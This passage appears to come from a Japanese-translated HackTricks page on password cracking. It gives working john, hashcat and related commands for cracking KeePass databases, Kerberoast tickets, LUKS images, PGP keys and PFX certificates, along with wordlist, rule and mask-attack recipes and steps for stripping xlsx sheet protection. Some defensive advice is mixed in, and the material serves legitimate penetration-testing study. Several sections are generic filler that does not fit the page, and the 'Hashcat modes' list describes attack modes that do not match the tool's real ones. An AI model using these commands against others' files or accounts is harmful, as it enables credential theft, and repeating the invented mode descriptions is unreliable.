Keepassは、パスワード管理ツールであり、パスワードの保存と安全な管理を提供します。Keepassは、強力な暗号化アルゴリズムを使用してパスワードデータベースを保護し、マスターパスワードを使用してアクセスを制御します。

Keepassのブルートフォース攻撃は、パスワードデータベースのマスターパスワードを解読するために使用される攻撃手法です。ブルートフォース攻撃では、すべての可能な組み合わせを試行し、正しいパスワードを見つけるまで続けます。

ブルートフォース攻撃は、非常に時間がかかる場合があります。しかし、強力なパスワードを使用している場合や、パスワードの長さが十分に長い場合は、攻撃が困難になります。

Keepassのブルートフォース攻撃を防ぐためには、強力なマスターパスワードを使用し、パスワードデータベースを定期的にバックアップすることが重要です。また、Keepassの最新バージョンを使用し、セキュリティのアップデートを適用することも推奨されます。

Keepassは、パスワード管理のための便利なツールですが、適切なセキュリティ対策を講じることが重要です。
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### ケベロースティング

Keberoastingは、Active Directory（AD）環境で使用されるサービスアカウントのパスワードをクラックするための攻撃手法です。この攻撃は、Kerberos認証プロトコルの脆弱性を利用しています。

攻撃者は、AD環境内のサービスアカウントのユーザー名を特定し、そのユーザー名を使用してKerberosチケットを要求します。次に、攻撃者は取得したチケットをオフラインで解析し、サービスアカウントのパスワードをクラックします。

Keberoasting攻撃は、サービスアカウントがKerberosサービスチケットを要求する際に使用するサービスプリンシパル名（SPN）の脆弱性に基づいています。攻撃者は、SPNがRC4暗号化で保護されている場合、その暗号化キーを取得し、オフラインで解析することができます。

この攻撃手法は、パスワードポリシーの弱さやサービスアカウントのパスワードの複雑さに依存しています。強力なパスワードポリシーと複雑なパスワードを使用することで、Keberoasting攻撃を防ぐことができます。

Keberoasting攻撃を防ぐためには、以下の対策を実施することが重要です。

- サービスアカウントのパスワードを定期的に変更する。
- サービスアカウントのパスワードを複雑なものに設定する。
- サービスアカウントのSPNを定期的に監視し、不正な変更を検知する。
- サービスアカウントのSPNをRC4暗号化からAES暗号化に変更する。

Keberoasting攻撃は、Active Directory環境でのセキュリティ評価やペネトレーションテストの一環として使用されることがあります。
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### ラックスイメージ

#### 方法1

インストール: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### メソッド2

Brute force is a common method used to crack passwords or encryption keys by systematically trying all possible combinations until the correct one is found. It is a time-consuming process that requires a lot of computational power, but it can be effective if the password or encryption key is weak or if the attacker has access to a large amount of computing resources.

To perform a brute force attack, the attacker needs a list of possible passwords or encryption keys to try. This list can be generated using various techniques, such as using a dictionary of common passwords, using a list of previously leaked passwords, or using a combination of characters and symbols.

Once the list of possible passwords or encryption keys is obtained, the attacker uses a program or script to systematically try each combination until the correct one is found. This process can take a long time, especially if the password or encryption key is complex and the list of possible combinations is large.

To speed up the brute force attack, attackers can use techniques such as parallel processing, where multiple computing resources are used simultaneously to try different combinations. They can also use specialized hardware, such as graphics processing units (GPUs), which are designed to perform calculations quickly and efficiently.

It is important to note that brute force attacks are not always successful. If the password or encryption key is strong and the list of possible combinations is too large, it may take an impractical amount of time and computational power to find the correct one. Additionally, many systems have security measures in place to detect and prevent brute force attacks, such as limiting the number of login attempts or implementing account lockouts.

Overall, brute force attacks can be a powerful tool for hackers, but they require significant computational resources and may not always be successful. It is important for individuals and organizations to use strong passwords and encryption keys to protect their sensitive information from brute force attacks.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
別のLuks BFチュートリアル：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPGの秘密鍵

Brute forcing a PGP/GPG private key is an extremely difficult task due to the large key space. The private key is typically protected by a passphrase, which adds an additional layer of security. However, if the passphrase is weak or easily guessable, it may be possible to brute force the key.

To brute force a PGP/GPG private key, you would need to generate all possible key combinations and test each one until the correct passphrase is found. This process can be time-consuming and resource-intensive, especially for longer and more complex passphrases.

There are several tools available that can assist in brute forcing PGP/GPG private keys, such as `pgcrack` and `gpg2john`. These tools automate the process of generating key combinations and testing them against the private key.

It is important to note that brute forcing a PGP/GPG private key is generally considered unethical and illegal without proper authorization. It is recommended to only use these techniques for legitimate purposes, such as recovering a forgotten passphrase or testing the strength of your own private key.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)を使用して、次にjohnを使用します。

### Open Office Pwd Protected Column

パスワードで保護された列を持つxlsxファイルがある場合、次の手順で保護を解除できます：

* **Googleドライブにアップロード**すると、パスワードが自動的に削除されます
* 手動で**削除**するには：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX証明書

PFX証明書は、公開鍵暗号方式で使用されるデジタル証明書の一種です。PFXは、パーソナル情報交換フォーマット（Personal Information Exchange Format）の略称です。PFX証明書は、秘密鍵と公開鍵のペアを含み、デジタル証明書の形式でエクスポートおよびインポートするために使用されます。

PFX証明書は、ブルートフォース攻撃の対象になる可能性があります。ブルートフォース攻撃は、すべての可能な組み合わせを試行し、正しいパスワードを見つけることを試みる攻撃手法です。PFX証明書のパスワードは、攻撃者によって推測される可能性があるため、強力なパスワードを使用することが重要です。

PFX証明書を保護するためには、以下の方法が有効です：

- 長く複雑なパスワードを使用する
- パスワードを定期的に変更する
- パスワードを他のアカウントと共有しない
- パスワードを安全な場所に保存する
- 不正アクセスを検知するための監視システムを導入する

PFX証明書のセキュリティを確保するためには、適切な対策を講じることが重要です。
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ツール

**ハッシュの例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### ハッシュ識別子
```bash
hash-identifier
> <HASH>
```
### ワードリスト

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **ワードリスト生成ツール**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 設定可能なベース文字、キーマップ、ルートを持つ高度なキーボードウォークジェネレーター。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Johnの変異

_**/etc/john/john.conf**_を読み、それを設定します。
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcatの攻撃方法

* **ワードリスト攻撃** (`-a 0`) とルール

**Hashcat**にはすでに**ルールが含まれたフォルダ**がありますが、[**ここで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **ワードリスト組み合わせ**攻撃

hashcatを使用して、2つのワードリストを1つに組み合わせることができます。\
もし、リスト1には単語**"hello"**が含まれており、2つ目のリストには単語**"world"**と**"earth"**が2行ずつ含まれていた場合、`helloworld`と`helloearth`という単語が生成されます。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **マスク攻撃** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* ワードリスト + マスク (`-a 6`) / マスク + ワードリスト (`-a 7`) 攻撃
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcatのモード

Hashcatは、さまざまなハッシュアルゴリズムをクラックするためのさまざまなモードを提供しています。以下にいくつかの一般的なモードを示します。

- **ハッシュモード**（モード0）：ハッシュ値を解読するための基本的なモードです。ハッシュアルゴリズムに応じて、ハッシュ値を解読するためのルールや攻撃方法を指定することができます。

- **ワードリストモード**（モード1）：事前に作成されたワードリストを使用して、ハッシュ値を解読するモードです。ワードリストには、一般的なパスワードや辞書ワードが含まれています。

- **組み合わせモード**（モード2）：複数のワードリストを組み合わせて使用し、ハッシュ値を解読するモードです。これにより、複数のワードリストを組み合わせて攻撃することができます。

- **ルールベースモード**（モード3）：ルールを使用して、ワードリストの単語を変形させ、ハッシュ値を解読するモードです。ルールには、文字の追加、置換、削除などの変換方法が含まれています。

- **ハイブリッドモード**（モード4）：ワードリストとルールを組み合わせて使用し、ハッシュ値を解読するモードです。ハイブリッドモードでは、ワードリストとルールの組み合わせを使用して攻撃を行います。

これらのモードは、さまざまな攻撃シナリオに対応しており、ハッシュ値の解読を効率的に行うことができます。
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Linuxハッシュのクラック - /etc/shadowファイル

## 概要

Linuxシステムでは、ユーザーのパスワードは/etc/shadowファイルにハッシュ化されて保存されます。このファイルは通常、rootユーザーのみがアクセスできるようになっています。しかし、ハッシュ関数の性質上、ハッシュ値から元のパスワードを復元することは不可能ではありません。このため、ハッシュを解読することで、ユーザーのパスワードを取得することができます。

## ブルートフォース攻撃

ブルートフォース攻撃は、ハッシュ値を解読するための一般的な手法です。この攻撃では、可能なすべてのパスワードの組み合わせを試し、ハッシュ値と一致するものを見つけることを目指します。

以下は、ブルートフォース攻撃の手順です。

1. ハッシュ値を取得します。/etc/shadowファイルからユーザーのハッシュ値を抽出します。
2. パスワードリストを作成します。攻撃者は、一般的なパスワードや辞書攻撃に使用するためのパスワードリストを作成します。
3. パスワードリストを使用して攻撃を開始します。攻撃者は、パスワードリスト内の各パスワードをハッシュ化し、ハッシュ値と一致するかどうかを確認します。
4. 一致するパスワードが見つかるまで繰り返します。攻撃者は、すべてのパスワードを試すまで繰り返します。

## ツールとリソース

ブルートフォース攻撃を実行するためには、以下のツールとリソースが必要です。

- パスワードリスト: ブルートフォース攻撃に使用するパスワードのリストです。一般的なパスワードや辞書攻撃に使用されることがあります。
- ハッシュクラッキングツール: ハッシュ値を解読するためのツールです。John the RipperやHashcatなどが一般的に使用されます。

## 対策方法

ユーザーのパスワードを保護するためには、以下の対策を実施することが重要です。

- 強力なパスワードポリシーの設定: ユーザーには、複雑なパスワードを使用するように要求するポリシーを設定します。
- パスワードのハッシュ化: パスワードはハッシュ関数を使用して保存されるべきです。また、ソルトを使用してハッシュ値をより安全にすることも重要です。
- パスワードリストの使用禁止: システム上で一般的なパスワードリストの使用を禁止します。
- ログイン試行回数の制限: ログイン試行回数を制限することで、ブルートフォース攻撃を防ぐことができます。

以上がLinuxハッシュのクラックに関する情報です。ユーザーのパスワードを保護するためには、適切な対策を実施することが重要です。
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Windowsハッシュのクラック

## 概要

Windowsオペレーティングシステムでは、ユーザーのパスワードはハッシュ形式で保存されます。ハッシュは元のパスワードを保護するために使用され、クラッキングすることでパスワードを復元することができます。このセクションでは、Windowsハッシュをクラックするための一般的な手法とリソースについて説明します。

## ブルートフォース攻撃

ブルートフォース攻撃は、すべての可能な組み合わせを試すことによってパスワードを推測する手法です。この攻撃は非常に時間がかかる場合がありますが、十分な計算リソースと時間があれば成功する可能性があります。

以下は、Windowsハッシュをクラックするためのブルートフォース攻撃の手順です。

1. ハッシュの取得: ターゲットのWindowsマシンからハッシュを取得します。これは、SAMファイルやNTDS.ditファイルから行うことができます。

2. パスワードリストの作成: ブルートフォース攻撃では、パスワードリストが必要です。一般的なパスワードや辞書攻撃に使用される単語リストを使用することができます。

3. ブルートフォースツールの使用: ブルートフォース攻撃を実行するためのツールを使用します。一般的なツールには、John the RipperやHashcatなどがあります。

4. 攻撃の実行: ツールを使用して、パスワードリストの各エントリをハッシュに適用します。ツールは、一致するパスワードを見つけるまで続けます。

5. パスワードの復元: ツールが一致するパスワードを見つけた場合、それを復元します。これにより、Windowsアカウントにアクセスすることができます。

## ハードウェアアクセラレーションの使用

ブルートフォース攻撃は非常に時間がかかるため、ハードウェアアクセラレーションを使用することで攻撃速度を向上させることができます。ハードウェアアクセラレーションは、GPU（グラフィックス処理ユニット）やASIC（アプリケーション固有集積回路）などの特殊なハードウェアを使用して計算を高速化します。

ハードウェアアクセラレーションを使用するためには、適切なツールと互換性のあるハードウェアが必要です。一部のツールは、特定のGPUやASICをサポートしています。

## クラウドベースの攻撃

ブルートフォース攻撃は、クラウドベースのリソースを使用することでさらに高速化することができます。クラウドプロバイダーの一部は、ブルートフォース攻撃に特化した仮想マシンを提供しています。これにより、大規模な計算リソースを利用することができます。

クラウドベースの攻撃を実行するためには、クラウドプロバイダーのアカウントを作成し、適切な仮想マシンをセットアップする必要があります。また、クラウドプロバイダーの料金体系に注意することも重要です。

## まとめ

Windowsハッシュのクラックには、ブルートフォース攻撃が一般的に使用されます。ハードウェアアクセラレーションやクラウドベースの攻撃を使用することで、攻撃速度を向上させることができます。ただし、これらの攻撃は合法的な目的でのみ使用することが重要です。
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack application hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Dictionary Attack

A dictionary attack is a type of brute force attack that uses a pre-defined list of commonly used passwords, known as a dictionary, to crack hashes. This method is effective against weak passwords that are easily guessable.

## Hybrid Attack

A hybrid attack combines elements of both brute force and dictionary attacks. It involves trying all possible combinations of characters, including variations of dictionary words, to crack hashes. This method is effective against stronger passwords that are not easily guessable.

## Rainbow Tables

Rainbow tables are precomputed tables of hashes and their corresponding plaintext passwords. They can be used to quickly crack hashes by looking up the plaintext password in the table. However, rainbow tables can be large and require a significant amount of storage space.

## GPU Acceleration

Graphics Processing Units (GPUs) can be used to accelerate the brute force cracking process. GPUs are highly parallel processors that can perform many calculations simultaneously, making them well-suited for password cracking. Tools like hashcat and John the Ripper support GPU acceleration.

## Online Hash Cracking Services

There are online services available that offer hash cracking capabilities. These services typically use powerful hardware and large databases of precomputed hashes to quickly crack passwords. However, using these services may raise ethical and legal concerns, so caution should be exercised.

## Conclusion

Brute force attacks, dictionary attacks, hybrid attacks, rainbow tables, GPU acceleration, and online hash cracking services are all methods that can be used to crack application hashes. Each method has its own advantages and disadvantages, and the choice of method will depend on factors such as the strength of the password and the available resources.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフローを簡単に構築および自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
